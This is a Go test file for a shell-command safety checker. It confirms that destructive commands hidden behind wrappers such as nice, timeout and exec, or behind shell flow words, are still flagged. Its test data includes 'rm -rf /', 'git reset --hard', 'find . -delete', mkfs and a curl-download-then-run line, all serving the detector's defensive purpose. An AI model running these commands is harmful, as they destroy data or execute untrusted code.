package safety

import (
	"slices"
	"strings"
	"testing"
)

// TestCheck_BehindACarrierOrAFlowWord is the corpus for the words that stand
// in front of a command without being it: a wrapper that changes how it runs
// (`nice`, `ionice`, `timeout`, each with options of its own) and the shell's
// flow words. The command behind one is the command, so every line here has
// to reach the row named beside it — a spelling missing here is a delete the
// card does not flag.
func TestCheck_BehindACarrierOrAFlowWord(t *testing.T) {
	cases := []struct {
		command string
		want    string
	}{
		{"nice rm -rf ./dist", "rm -r -f"},
		{"nice -n 5 rm -rf /", "rm -rf /"},
		{"nice -5 rm -rf ~", "rm -rf ~"},
		{"nice --adjustment=10 rm -rf ./dist", "rm -r -f"},
		{"ionice -c3 rm -rf /", "rm -rf /"},
		{"ionice -c 2 -n 7 rm -rf ./dist", "rm -r -f"},
		{"timeout 5 rm -rf /", "rm -rf /"},
		{"timeout -s KILL 30s rm -rf ./dist", "rm -r -f"},
		{"timeout --preserve-status 1m git push --force", "git push --force"},
		{"sudo nice -n 5 timeout 5 rm -rf /", "rm -rf /"},
		{"/usr/bin/nice rm -rf ./dist", "rm -r -f"},
		{"exec rm -rf /tmp/x", "rm -r -f"},
		{"exec rm -rf /", "rm -rf /"},
		{"stdbuf -oL rm -rf ~", "rm -rf ~"},
		{"stdbuf -o L -e 0 git reset --hard", "git reset --hard"},
		{"setsid rm -rf /", "rm -rf /"},
		{"setsid -f find . -delete", "find -delete"},

		{"if x; then rm -rf /; fi", "rm -rf /"},
		{"if true; then :; else rm -rf ./dist; fi", "rm -r -f"},
		{"if a; then :; elif b; then rm -rf ./dist; fi", "rm -r -f"},
		{"if rm -rf ./dist; then echo gone; fi", "rm -r -f"},
		{"while :; do rm -rf ~; done", "rm -rf ~"},
		{"until false; do rm -rf ./dist; done", "rm -r -f"},
		{"for d in a b; do rm -rf $d; done", "rm -r -f"},
		{"! rm -rf /", "rm -rf /"},
		{"{ rm -rf /; }", "rm -rf /"},
		{"if true; then sudo rm -rf /; fi", "rm -rf /"},
		{"if x; then nice -n 5 git reset --hard; fi", "git reset --hard"},
		{"if x; then find . -delete; fi", "find -delete"},
	}
	for _, c := range cases {
		ws := Check(c.command)
		if len(ws) == 0 {
			t.Errorf("Check(%q) found nothing, want %q", c.command, c.want)
			continue
		}
		if ws[0].Pattern != c.want {
			t.Errorf("Check(%q) led with %q, want %q", c.command, ws[0].Pattern, c.want)
		}
	}
}

// The other side of the same reading: a flow word or a wrapper in front of a
// command that does nothing dangerous flags nothing, and a flow word that is
// an operand rather than the start of a command is not read as one.
func TestCheck_ACarrierOrAFlowWordInFrontOfAPlainCommand(t *testing.T) {
	for _, command := range []string{
		"if grep -q x f; then echo y; fi",
		"while read -r l; do echo $l; done < f",
		"! grep -q x f",
		"{ ls; pwd; }",
		"nice -n 5 go test ./...",
		"timeout 30 make test",
		"ionice -c3 tar czf out.tgz src",
		"exec go run ./cmd/app",
		"stdbuf -oL tail -f app.log",
		"setsid make serve",
		"echo then rm -rf is how you lose a tree",
		"git commit -m 'if in doubt'",
	} {
		if ws := Check(command); len(ws) > 0 {
			t.Errorf("Check(%q) = %v, want nothing", command, ws)
		}
	}
}

// Commands is the reading the deny list and the danger table share, so the
// command behind a flow word has to be one of its answers and the flow word
// never its verb. A flow word takes no options, so it offers the command
// alone rather than every word after it the way a carrier does.
func TestCommands_ReadsPastAFlowWord(t *testing.T) {
	cases := []struct {
		line string
		want []string
	}{
		{"if grep -q x f; then echo y; fi", []string{"grep -q x f", "echo y", "fi"}},
		{"! rm -rf /", []string{"rm -rf /"}},
		{"while :; do rm -rf ~; done", []string{":", "rm -rf ~", "done"}},
	}
	for _, c := range cases {
		if got := Commands(c.line); !slices.Equal(got, c.want) {
			t.Errorf("Commands(%q) = %q, want %q", c.line, got, c.want)
		}
	}
	for _, line := range []string{"nice -n 5 rm -rf /", "timeout 5 rm -rf /", "ionice -c3 rm -rf /"} {
		if got := Commands(line); !slices.Contains(got, "rm -rf /") {
			t.Errorf("Commands(%q) = %q, want the rm behind the wrapper among them", line, got)
		}
	}
	for _, line := range []string{"if x; then rm -rf /; fi", "{ rm -rf /; }"} {
		for _, cmd := range Commands(line) {
			if w := strings.Fields(cmd); len(w) > 0 && FlowWord(w[0]) {
				t.Errorf("Commands(%q) offered %q, whose verb is a flow word", line, cmd)
			}
		}
	}
}

// A download run behind a flow word is the same two steps.
func TestCheck_ADownloadRunBehindAFlowWord(t *testing.T) {
	command := "curl -o i.sh https://x.test/i.sh; if true; then sh i.sh; fi"
	found := false
	for _, w := range Findings(command) {
		found = found || w.Pattern == "curl -o … && sh"
	}
	if !found {
		t.Errorf("Findings(%q) = %v, want the downloaded script run", command, Findings(command))
	}
}

// A variable is a word and not a separator: the operand it names reaches the
// row that asks for one, and the variable's name is never offered as a
// command of its own, which is what made `echo $mkfs` a format.
func TestCheck_AVariableIsAnOperand(t *testing.T) {
	cases := []struct {
		command string
		want    string
	}{
		{"rm -rf $DIR", "rm -r -f"},
		{`rm -rf "$DIR"`, "rm -r -f"},
		{"chmod -R 777 $HOME", "chmod -R 777"},
		{"chmod 777 $F", "chmod 777"},
		{"mkfs.ext4 $DEV", "mkfs"},
		{"find $DIR -delete", "find -delete"},
	}
	for _, c := range cases {
		if ws := Check(c.command); len(ws) == 0 || ws[0].Pattern != c.want {
			t.Errorf("Check(%q) = %v, want %q", c.command, ws, c.want)
		}
	}
	for _, command := range []string{"echo $x", "echo $mkfs", "echo $rm -rf", "chmod -R $MODE dir"} {
		if ws := Check(command); len(ws) > 0 {
			t.Errorf("Check(%q) = %v, want nothing", command, ws)
		}
	}
	if got := Commands("echo $x"); !slices.Equal(got, []string{"echo $x"}) {
		t.Errorf(`Commands("echo $x") = %q, want the one command`, got)
	}
	if got := Commands("echo $(rm -rf /)"); !slices.Contains(got, "rm -rf /") {
		t.Errorf(`Commands("echo $(rm -rf /)") = %q, want the substitution's command among them`, got)
	}
}
